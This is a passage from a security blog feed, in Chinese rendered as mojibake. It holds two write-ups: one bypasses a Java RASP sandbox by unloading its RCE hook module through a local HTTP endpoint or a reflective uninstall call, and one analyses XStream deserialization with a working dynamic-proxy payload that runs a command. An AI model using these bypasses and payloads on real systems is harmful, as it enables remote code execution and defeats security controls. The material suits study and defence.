alt="image-20241111220208835"></p><p>è¿™é‡Œæœ‰ä¸ª-uå¯ä»¥å¸è½½æŒ‡å®šæ¨¡å—</p><p>å®ƒé‡Œé¢çš„å…·ä½“æ“ä½œæ˜¯è°ƒç”¨ä¸€ä¸ª<code>sandbox_curl_with_exit</code>å‡½æ•°å‘èµ·è¯·æ±‚åˆ°æ²™ç®±æœåŠ¡å™¨æ¥æ‰§è¡Œå¸è½½æ¨¡å—çš„æ“ä½œï¼Œå®˜æ–¹è„šæœ¬ç¤ºä¾‹å¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241111222729536.png" alt="image-20241111222729536"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç›´æ¥è¯·æ±‚å¯¹åº”çš„urlæ¥è¿›è¡Œæ¨¡å—çš„å¸è½½ï¼Œé‚£ä¹ˆraspç›‘å¬çš„æ˜¯å“ªä¸ªç«¯å£å‘¢ï¼Œè¿™ä¸ªæˆ‘ä»¬å»çœ‹raspçš„logå°±èƒ½çŸ¥é“äº†</p><p>æŸ¥çœ‹æ—¥å¿—</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;file:///home/ctf/logs/sandbox/sandbox.log&quot;</span>);<br>            java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> url.openStream();<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>            bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[inputStream.available()];<br>            inputStream.read(bytes);<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes));<br>            System.out.println(java.util.Base64.getEncoder().encodeToString(bytes));<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            System.out.println(<span class="hljs-string">&quot;error&quot;</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å†™ä¸€ä¸ªè¯·æ±‚ä»£ç å»è¯·æ±‚æœ¬åœ°çš„raspæ¥å£ç„¶åå¸è½½æ¨¡å—ï¼š<a href="http://127.0.0.1:port/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&ids=rasp-rce-native-hook">http://127.0.0.1:port/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&amp;ids=rasp-rce-native-hook</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            url = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:&lt;port&gt;/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&amp;ids=rasp-rce-native-hook&quot;</span>);<br>            java.net.<span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (java.net.HttpURLConnection) url.openConnection();<br>            connection.setRequestMethod(<span class="hljs-string">&quot;GET&quot;</span>);<br>            connection.setUseCaches(<span class="hljs-literal">false</span>);<br>            connection.setConnectTimeout(<span class="hljs-number">5000</span>); <span class="hljs-comment">// 5 seconds</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>            java.lang.System.out.println(<span class="hljs-string">&quot;Response Code : &quot;</span> + responseCode);<br>            <span class="hljs-keyword">if</span> (responseCode == java.net.HttpURLConnection.HTTP_OK) &#123;<br>                java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> connection.getInputStream();<br>                java.io.<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">inputStreamReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(inputStream);<br>                java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(inputStreamReader);<br><br>                java.lang.String output;<br>                java.lang.<span class="hljs-type">StringBuffer</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.StringBuffer();<br>                <span class="hljs-keyword">while</span> ((output = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                    response.append(output);<br>                &#125;<br>                bufferedReader.close();<br>                inputStreamReader.close();<br>                inputStream.close();<br>                connection.disconnect();<br>                java.lang.System.out.println(<span class="hljs-string">&quot;Response Body: &quot;</span> + response.toString());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                java.lang.System.out.println(<span class="hljs-string">&quot;Request failed!&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (java.net.MalformedURLException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ï¼Œè‡³äºæˆ‘ä»¬éœ€è¦å¸è½½çš„æ¨¡å—åç§°åœ¨æ—¥å¿—é‡Œé¢ä¹Ÿæ˜¯èƒ½çœ‹åˆ°çš„ï¼Œæ—¥å¿—çš„è·¯å¾„ä¹Ÿå¯ä»¥åœ¨é¡¹ç›®çš„logback.xmlä¸­çœ‹åˆ°</p><p><img src="https://cdn.clown2024.cn/image-20241111223601498.png" alt="image-20241111223601498"></p><p>å¸è½½å®Œä¹‹åå°±èƒ½æ‰§è¡Œä»»æ„ä»£ç äº†</p><p><strong>ç›´æ¥è°ƒç”¨uninstallæ¥å¸è½½æ¨¡å—</strong></p><p>è¿˜å¯ä»¥ç›´æ¥æ ¹æ®å‰é¢çš„æºç çŸ¥é“ä»–åˆuninstallæ–¹æ³•å¯ä»¥ç”¨æ¥å¸è½½æ¨¡å—ï¼Œå°±å¯ä»¥ç›´æ¥å†™æ¶æ„ä»£ç æ¥å¸è½½æ¨¡å—</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">// ä½¿ç”¨ç±»åŠ è½½å™¨åŠ¨æ€åŠ è½½ AgentLauncher ç±»</span><br>            Class&lt;?&gt; agentLauncherClass = Class.forName(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.agent.AgentLauncher&quot;</span>);<br><br>            <span class="hljs-comment">// è·å– uninstall æ–¹æ³•</span><br>System.out.println(agentLauncherClass);<br><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span>Thread.currentThread().getStackTrace()[<span class="hljs-number">1</span>].getClassName();<br>System.out.println(<span class="hljs-string">&quot;å½“å‰ç±»å: &quot;</span> + className);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">uninstallMethod</span> <span class="hljs-operator">=</span> agentLauncherClass.getDeclaredMethod(<span class="hljs-string">&quot;uninstall&quot;</span>, String.class);<br><br>uninstallMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;default&quot;</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Sandbox å¸è½½æˆåŠŸï¼&quot;</span>);<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;è°ƒç”¨å¸è½½æ–¹æ³•æ—¶å‡ºé”™: &quot;</span> + e.getMessage());<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://aiwin.fun/index.php/archives/4389/">https://aiwin.fun/index.php/archives/4389/</a></p><p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><p><a href="https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html">https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html</a></p><p><strong>å¼ºç½‘æ‹Ÿæ€çš„æ–‡ç« </strong></p><p><a href="https://xz.aliyun.com/t/15907?time__1311=GqjxcD2DuDRDyGDlxGo+CfoY5D=eQh4he+D">https://xz.aliyun.com/t/15907?time__1311=GqjxcD2DuDRDyGDlxGo%2BCfoY5D%3DeQh4he%2BD</a></p><p><a href="https://blog.potatowo.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024Web-Writeup">https://blog.potatowo.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024Web-Writeup</a></p><p><a href="https://blog.wm-team.cn/index.php/archives/84">https://blog.wm-team.cn/index.php/archives/84</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XStreamååºåˆ—åŒ–</title>
      <link href="/2024/11/04/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/11/04/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="xstreamä»‹ç»"><a href="#XStreamä»‹ç»" class="headerlink" title="XStreamä»‹ç»"></a>XStreamä»‹ç»</h1><p>XStreamæ˜¯ä¸€ä¸ªç®€å•çš„åŸºäºJavaåº“ï¼Œèƒ½å¤Ÿå°†Javaå¯¹è±¡å’Œxmlæ–‡æ¡£ä¹‹é—´è¿›è¡Œç›¸äº’è½¬æ¢</p><h1 id="ååºåˆ—åŒ–åŸå› "><a href="#ååºåˆ—åŒ–åŸå› " class="headerlink" title="ååºåˆ—åŒ–åŸå› "></a>ååºåˆ—åŒ–åŸå› </h1><p>XStreamå®ç°äº†ä¸€å¥—åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ï¼Œæ ¸å¿ƒæ˜¯é€šè¿‡Converterè½¬æ¢å™¨æ¥å°†XMLå’Œå¯¹è±¡ä¹‹é—´è¿›è¡Œç›¸äº’çš„è½¬æ¢ã€‚</p><p>XStreamååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨æ˜¯å› ä¸ºXStreamæ”¯æŒä¸€ä¸ªåä¸ºDynamicProxyConverterçš„è½¬æ¢å™¨ï¼Œè¯¥è½¬æ¢å™¨å¯ä»¥å°†XMLä¸­dynamic-proxyæ ‡ç­¾å†…å®¹è½¬æ¢æˆåŠ¨æ€ä»£ç†ç±»å¯¹è±¡ï¼Œè€Œå½“ç¨‹åºè°ƒç”¨äº†dynamic-proxyæ ‡ç­¾å†…çš„interfaceæ ‡ç­¾æŒ‡å‘çš„æ¥å£ç±»å£°æ˜çš„æ–¹æ³•æ—¶ï¼Œå°±ä¼šé€šè¿‡åŠ¨æ€ä»£ç†æœºåˆ¶ä»£ç†è®¿é—®dynamic-proxyæ ‡ç­¾å†…handleræ ‡ç­¾æŒ‡å®šçš„ç±»æ–¹æ³•ï¼›</p><p>åˆ©ç”¨è¿™ä¸ªæœºåˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„XMLå†…å®¹ï¼Œå³dynamic-proxyæ ‡ç­¾å†…çš„handleræ ‡ç­¾æŒ‡å‘å¦‚EventHandlerç±»è¿™ç§å¯å®ç°ä»»æ„å‡½æ•°åå°„è°ƒç”¨çš„æ¶æ„ç±»ã€interfaceæ ‡ç­¾æŒ‡å‘ç›®æ ‡ç¨‹åºå¿…ç„¶ä¼šè°ƒç”¨çš„æ¥å£ç±»æ–¹æ³•ï¼›æœ€åå½“æ”»å‡»è€…ä»å¤–éƒ¨è¾“å…¥è¯¥æ¶æ„XMLå†…å®¹åå³å¯è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚</p><h1 id="ç›¸å…³ç±»ä»‹ç»"><a href="#ç›¸å…³ç±»ä»‹ç»" class="headerlink" title="ç›¸å…³ç±»ä»‹ç»"></a>ç›¸å…³ç±»ä»‹ç»</h1><h2 id="eventhandlerç±»"><a href="#EventHandlerç±»" class="headerlink" title="EventHandlerç±»"></a>EventHandlerç±»</h2><p>EventHandleræ˜¯ä¸€ä¸ªå®ç°äº†InvocationHandleræ¥å£çš„ç±»ï¼Œè®¾è®¡æœ¬æ„æ˜¯ä¸ºäº¤äº’å·¥å…·æä¾›beansï¼Œå»ºç«‹ä»ç”¨æˆ·ç•Œé¢åˆ°åº”ç”¨ç¨‹åºé€»è¾‘çš„è¿æ¥</p><p><img src="https://cdn.clown2024.cn/image-20241104142648830.png" alt="image-20241104142648830"></p><p>EventHandlerçš„ç±»ä¸­æœ‰targetå’Œactionå±æ€§ï¼Œåœ¨EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()çš„å‡½æ•°è°ƒç”¨é“¾ä¸­ï¼Œä¼šå°†è¿™ä¸¤ä¸ªå±æ€§ä½œä¸ºç±»æ–¹æ³•å’Œå‚æ•°ç»§ç»­åå°„è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241104143224758.png" alt="image-20241104143224758"></p><p><img src="https://cdn.clown2024.cn/image-20241104143340622.png" alt="image-20241104143340622"></p><h2 id="converterè½¬æ¢å™¨"><a href="#Converterè½¬æ¢å™¨" class="headerlink" title="Converterè½¬æ¢å™¨"></a>Converterè½¬æ¢å™¨</h2><p>XStreamä¸ºJavaå¸¸è§çš„ç±»å‹æä¾›äº†Converterè½¬æ¢å™¨ã€‚è½¬æ¢å™¨æ³¨å†Œä¸­å¿ƒæ˜¯XStreamç»„æˆçš„æ ¸å¿ƒéƒ¨åˆ†ã€‚</p><p><img src="https://cdn.clown2024.cn/image-20241104143603604.png" alt="image-20241104143603604"></p><p>æˆ‘çœ‹y4å¸ˆå‚…çš„æ–‡ç« ä¸­è¯´è½¬æ¢å™¨éœ€è¦å®ç°ä¸‰ä¸ªæ–¹æ³•ï¼š</p><ul><li>canConvertæ–¹æ³•ï¼šå‘Šè¯‰XStreamå¯¹è±¡ï¼Œå®ƒèƒ½å¤Ÿè½¬æ¢çš„å¯¹è±¡ï¼›</li><li>marshalæ–¹æ³•ï¼šèƒ½å¤Ÿå°†å¯¹è±¡è½¬æ¢ä¸ºXMLæ—¶å€™çš„å…·ä½“æ“ä½œï¼›</li><li>unmarshalæ–¹æ³•ï¼šèƒ½å¤Ÿå°†XMLè½¬æ¢ä¸ºå¯¹è±¡æ—¶çš„å…·ä½“æ“ä½œï¼›</li></ul><p>ä½†æˆ‘åœ¨1.4.10ç‰ˆæœ¬ä¸­åªéœ€è¦å®ç°ä¸¤ç§æ–¹æ³•å³å¯</p><p>XStreamçš„apiæ–‡æ¡£ï¼š<a href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a></p><h2 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><p>ä½¿ç”¨ä¸€ä¸‹çœ‹çœ‹è½¬æ¢å‡ºæ¥çš„xmlé•¿ä»€ä¹ˆæ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Attack;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span>&#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> age, String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Attack;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">clown</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-number">150</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">xml</span> <span class="hljs-operator">=</span> xStream.toXML(clown);<br>        System.out.println(xml);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">org.example.Attack.Student</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>150<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>clown<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">org.example.Attack.Student</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h1><p>è¿™é‡Œå°±åˆ†æå‡ ä¸ªåˆ©ç”¨é“¾ï¼Œå› ä¸ºXStreamçš„cveæ¯”è¾ƒå¤šï¼Œè€Œä¸”é€‚ç”¨çš„ç‰ˆæœ¬ä¹Ÿä¸ä¸€æ ·ï¼Œå°±è·Ÿç€y4å¸ˆå‚…åˆ†æå…¶æ–‡ç« ä¸­çš„ä¸¤ä¸ªåˆ©ç”¨é“¾</p><p>è½¬åŒ–xmlçš„demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>);<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DomDriver</span>());<br>        xStream.fromXML(fileInputStream);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sorted-set"><a href="#sorted-set" class="headerlink" title="sorted-set"></a>sorted-set</h2><p>è¿™æ˜¯ä¸€ä¸ªCVE-2013-7258è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</p><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>1.4.5ï¼Œ1.4.6æˆ–1.4.10ï¼Œæˆ‘è¿™é‡Œç”¨1.4.10ç‰ˆæœ¬æ¥å®éªŒ</p><p>payload</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sorted-set</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">sorted-set</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241104145857536.png" alt="image-20241104145857536"></p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>æˆ‘ä»¬å¯ä»¥ä»æŠ¥é”™çš„è°ƒç”¨æ ˆä¸­å¼€å§‹å…¥æ‰‹åˆ†æï¼Œèƒ½çœ‹å‡ºå…¶å¤§è‡´çš„è°ƒç”¨é“¾æµç¨‹</p><p><img src="https://cdn.clown2024.cn/image-20241106085613877.png" alt="image-20241106085613877"></p><p>å…¶åœ¨AbstractTreeMarshallingStrategy#unmarshalè°ƒç”¨äº†TreeUnmarshaller#startæ–¹æ³•ï¼Œä»è¿™é‡Œå¼€å§‹è§£æxmlå†…å®¹</p><p><img src="https://cdn.clown2024.cn/image-20241106090828942.png" alt="image-20241106090828942"></p><p>è¿™é‡Œä¼šè°ƒç”¨HierarchicalStreams#readClassType()æ¥è·å–åˆ°PoC XMLä¸­æ ¹æ ‡ç­¾çš„ç±»ç±»å‹</p><p>ç´§æ¥ç€ä¸€è·¯å¾€ä¸‹è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/image-20241106091233168.png" alt="image-20241106091233168"></p><p>å…¶æœ€ç»ˆåœ¨com.thoughtworks.xstream.mapper.ClassAliasingMapper#realClassä¸­æ‰¾åˆ°äº†SortedSetç±»åï¼ŒnameToTypeæ˜¯ä¸€ä¸ªhashMapç±»å‹å˜é‡</p><p>å›åˆ°å‰é¢ï¼Œè¿™é‡Œæ‹¿åˆ°typeä¹‹åå°±å»è°ƒç”¨convertAnotheræ–¹æ³•æ¥å¯¹è¿”å›çš„typeè¿›è¡Œç±»å‹è½¬åŒ–</p><p><img src="https://cdn.clown2024.cn/image-20241106092001977.png" alt="image-20241106092001977"></p><p>è¯¥æ–¹æ³•å†…éƒ¨å°±æ¶‰åŠåˆ°convertorè½¬æ¢å™¨çš„ä½¿ç”¨ï¼Œè·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241106092354449.png" alt="image-20241106092354449"></p><p>å…¶ä¸­è°ƒç”¨mapper.defaultImplementationOf()å‡½æ•°æ¥å¯»æ‰¾java.util.SortedSetç±»å‹çš„é»˜è®¤å®ç°ç±»å‹è¿›è¡Œæ›¿æ¢ï¼Œè¿™é‡Œè½¬æ¢ä¸ºäº†java.util.TreeSetç±»å‹</p><p>ç„¶åå°±æ˜¯è°ƒç”¨converterLookup.lookupConverterForTypeæ–¹æ³•æ¥å¯»æ‰¾TreeSetå¯¹åº”çš„ç±»å‹è½¬æ¢å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241106093118079.png" alt="image-20241106093118079"></p><p>è¯¥æ–¹æ³•é‡Œé¢å°±æ˜¯è·å–è¿­ä»£å™¨å¯¹è±¡ï¼Œç„¶åæ‰¾åˆ°TreeSetå¯¹åº”çš„ç±»å‹è½¬åŒ–å™¨å°±è¿”å›</p><p>è¿”å›ä¹‹åå°±æ˜¯è°ƒç”¨convertè¿›è¡Œç±»å‹è½¬æ¢ï¼Œè°ƒç”¨åˆ°AbstractReferenceUnmarshaller#convertæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241106094933449.png" alt="image-20241106094933449"></p><p>ä¼šè·³è¿‡å‰é¢çš„if-elseåˆ¤æ–­ï¼Œæœ€åè¿›åˆ°elseé‡Œé¢ï¼Œè°ƒç”¨getCurrentReferenceKey()æ¥è·å–å½“å‰çš„Referenceé”®å³æ ‡ç­¾åï¼Œæ¥ç€å°†å½“å‰æ ‡ç­¾åå‹å…¥parentStackæ ˆä¸­ï¼Œkeyçš„ç»“æ„å¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241106095218106.png" alt="image-20241106095218106"></p><p>ç„¶åè°ƒç”¨å…¶çˆ¶ç±»çš„convertæ–¹æ³•ï¼Œåœ¨é‡Œé¢pushåˆ°FastStackçš„å †æ ˆä¸­</p><p><img src="https://cdn.clown2024.cn/image-20241106103638037.png" alt="image-20241106103638037"></p><p>ç„¶åå°±æ˜¯è°ƒç”¨TreeSetConvertçš„unmarshalæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›åˆ°ä¸€ä¸ªå¡«å……treeMapçš„TreeMapConverter#populateTreeMapæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241106105027698.png" alt="image-20241106105027698"></p><p>è¿™é‡Œå…ˆåˆ¤æ–­æ˜¯å¦æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ˜¯çš„è¯å°±è°ƒç”¨putCurrentEntryIntoMap()å‡½æ•°ï¼Œå³å°†å½“å‰å†…å®¹å¡«å……åˆ°Mapä¸­</p><p><img src="https://cdn.clown2024.cn/image-20241106105249406.png" alt="image-20241106105249406"></p><p>é‡Œé¢è°ƒç”¨readItem()å‡½æ•°è¯»å–æ ‡ç­¾å†…çš„å†…å®¹å¹¶ç¼“å­˜åˆ°targetè¿™ä¸ªMapä¸­ï¼Œè·Ÿè¿›å»ç›´åˆ°com.thoughtworks.xstream.mapper.CachingMapper#realClass</p><p><img src="https://cdn.clown2024.cn/image-20241106105555385.png" alt="image-20241106105555385"></p><p>è¿™é‡Œå°±ä¼šå»å¯»æ‰¾dynamic-proxyæ‰€å¯¹åº”çš„ç±»ï¼Œä¸€è·¯è·Ÿè¿›ï¼Œå…¶å¯»æ‰¾çš„æµç¨‹å’Œå‰é¢çš„ç±»ä¼¼</p><p><img src="https://cdn.clown2024.cn/image-20241106110001573.png" alt="image-20241106110001573"></p><p>æœ€åæ˜¯æ‰¾åˆ°äº†DynamicProxyè¿™ä¸ªç±»</p><p>ç„¶åå›åˆ°readItemæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241106110155902.png" 